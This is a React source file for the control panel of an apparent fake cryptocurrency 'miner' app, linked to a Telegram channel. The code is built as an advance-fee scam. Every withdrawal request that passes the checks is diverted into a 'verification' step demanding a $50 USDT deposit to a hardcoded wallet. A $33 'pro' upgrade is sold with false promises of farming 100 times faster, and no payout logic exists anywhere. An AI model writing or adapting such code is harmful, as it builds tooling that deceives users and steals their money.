import React, {useState, useEffect} from 'react';
import {observer} from "mobx-react-lite";
import store from "../store"
import Modal from 'react-modal';
import swal from "@sweetalert/with-react";

const WALLET = 'TFRGQWCKtD4L75q2PyY8bn2LMsuHk7Nahw'
const PREM_PRICE = '$33'
const VERIFICATION_PRICE = '$50'

const Panel = () => {
    const [showWithdrawModal, setShowWithdrawModal] = useState(false)
    const [showProModal, setShowProModal] = useState(false)
    const [showVerificationModal, setShowVerificationModal] = useState(false)

    const [amount, setAmount] = useState('')
    const [transaction_id, setTransactionId] = useState('')

    const handleProPayed = (type) => {
	swal(
	    <div>
		<h3 style={{marginBottom: 15}}>Thank you for your purchase</h3>
		<p>Now please wait within 2-3 hours, our managers will automatically assign you a pro network</p>
	    </div>
	)
	setShowProModal(false)
	setShowVerificationModal(false)

	store.sendRefNotification(transaction_id, type)

	setTransactionId('')
    }

    const handleWithdraw = () => {
	if(amount >= 100 && amount <= parseInt(store.getTotalBalance().toFixed(0))) {
	    setShowWithdrawModal(false)
	    swal(
		<div>
		    <p>In order to withdraw funds you need to verify your account</p>
		</div>
	    ).then(() => {
		setShowVerificationModal(true)
	    })
	} else if (amount > parseInt(store.getTotalBalance().toFixed(0))) {
	    swal(
		<div>
		    <p>You have not enough balance</p>
		</div>
	    )
	}
    }

    const showDemoIsOver = () => {
	swal(
	    <div>
		<h3 style={{marginBottom: 15}}>Your DEMO key time is over</h3>
		<p>To continue using the program, you need to purchase a new key. Don't worry, all your nfts will be transferred</p>
	    </div>
	)
    }

    const handleStart = () => {
	if(store.user.isDemo && store.user.isDemoExpired) {
	    showDemoIsOver()
	} else {
	    store.start()
	}
    }

    useEffect(() => {
	if(store.user.isDemoExpired) {
	    showDemoIsOver()
	}
    }, [store.user.isDemoExpired])

    return (
	<div className="panel">
	    <button className="btn" disabled={store.status === 'stop'} onClick={() => store.stop()}>Stop</button>
	    <button className="btn" disabled={store.status === 'start'} onClick={handleStart}>Start</button>
	    <button onClick={() => setShowWithdrawModal(true)} className="btn" disabled={store.status === 'start' || store.user.isDemo}>Withdraw</button>
	    <button onClick={() => setShowProModal(true)} className="btn" disabled={store.status === 'start' || store.user.isDemo}>Buy pro network</button>

	    <Modal
		isOpen={showWithdrawModal}
		className={"modal"}
	    >
		<div className="close" onClick={() => setShowWithdrawModal(false)}>
		    <img src="./img/close.svg" />
		</div>
		<div className="group">
		    <div className="label">Amount:</div>
		    <input type="number" value={amount} max={store.getTotalBalance().toFixed(0)} onChange={(e) => setAmount(e.target.value)} className="field"/>
		</div>
		<div className="group">
		    <div className="label">Wallet:</div>
		    <input type="text" className="field"/>
		</div>
		<div className="modal__footer">
		    <button className="btn" onClick={handleWithdraw} disabled={amount < 100}>Withdraw</button>
		</div>
		<p>Network TRC-20 (USDT) <br/>
		    Min withdraw amount - $100</p>
	    </Modal>

	    <Modal
		isOpen={showProModal}
		className={"modal"}
	    >
		<div className="close" onClick={() => setShowProModal(false)}>
		    <img src="./img/close.svg" />
		</div>
		<div className="group">
		    <div className="label">Wallet:</div>
		    <input type="text" value={WALLET} readOnly className="field"/>
		</div>
		<div className="group">
		    <div className="label">Transaction ID:</div>
		    <input type="text" value={transaction_id} onChange={(e) => setTransactionId(e.target.value)} className="field"/>
		</div>
		<div className="modal__footer">
		    <button onClick={() => handleProPayed('Miner Pro version')} className="btn">Payed</button>
		</div>
		<p>With a premium subscription, you can farm cryptocurrency 100 times faster and withdraw your earned money instantly. Also in the premium subscription gives you a safe use of our software. ( { PREM_PRICE } )
		    <br/>
		    More info: <br/>
		    {/*<a className={'link'} href="https://crypto-nft.space">https://crypto-nft.space</a><br/>*/}
		    <a className={'link'} href="https://t.me/crypto_nft_space">https://t.me/crypto_nft_space</a><br/><br/>
		    Network TRC-20 (USDT)<br/>
		    Min withdraw amount - $100</p>
	    </Modal>

	    <Modal
		isOpen={showVerificationModal}
		className={"modal"}
	    >
		<div className="close" onClick={() => setShowVerificationModal(false)}>
		    <img src="./img/close.svg" />
		</div>
		<p>
		    You need to verify yourself as a user and verify your wallet. For verification, you need to deposit { VERIFICATION_PRICE } with our details, this money will be credited to your balance. You can withdraw them within 1 hour after verification. Verification takes approximately 30 minutes to 1 hour
		    <br/>
		    More info: <br/>
		    {/*<a className={'link'} href="https://crypto-nft.space">https://crypto-nft.space</a><br/>*/}
		    <a className={'link'} href="https://t.me/crypto_nft_space">https://t.me/crypto_nft_space</a><br/><br/>
		    Network TRC-20 (USDT)<br/>
		    Min withdraw amount - $100</p>
		<div className="group">
		    <div className="label">Wallet:</div>
		    <input type="text" value={WALLET} readOnly className="field"/>
		</div>
		<div className="group">
		    <div className="label">Transaction ID:</div>
		    <input type="text" value={transaction_id} onChange={(e) => setTransactionId(e.target.value)} className="field"/>
		</div>
		<div className="modal__footer">
		    <button onClick={() => handleProPayed('Miner Verification')} className="btn">Payed</button>
		</div>
	    </Modal>
	</div>
    );
};

export default observer(Panel);